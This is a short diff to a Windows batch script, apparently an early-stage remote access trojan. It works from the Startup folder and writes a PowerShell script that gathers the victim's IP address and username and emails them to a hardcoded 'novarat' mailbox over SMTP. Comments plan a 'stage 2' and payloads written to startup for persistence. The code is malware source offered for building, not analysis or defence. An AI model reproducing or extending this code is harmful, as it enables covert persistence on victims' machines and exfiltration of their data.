@@ -11,18 +11,15 @@ cd %STARTUP%
 
 @REM setup smtp
 (
-    echo $email = "example@gmail.com"
+    echo $email = "novarat@mail.com"
     echo $password = "password"
     echo $ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress
-    echo echo "ip:$ip" > "$env:UserName.rat"
-
-
     echo $subject = "$env:UserName logs"
     echo $smtp = New-Object System.Net.Mail.SmtpClient("smtp.mail.com", "587");
     echo $smtp.EnableSSL = $true
     echo $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);
     echo $smtp.Send($email, $email, $subject, $ip);
-) > smtp.txt
+) > smtp.ps1
 
 @REM TODO: build out stage 2
 @REM write payloads to startup
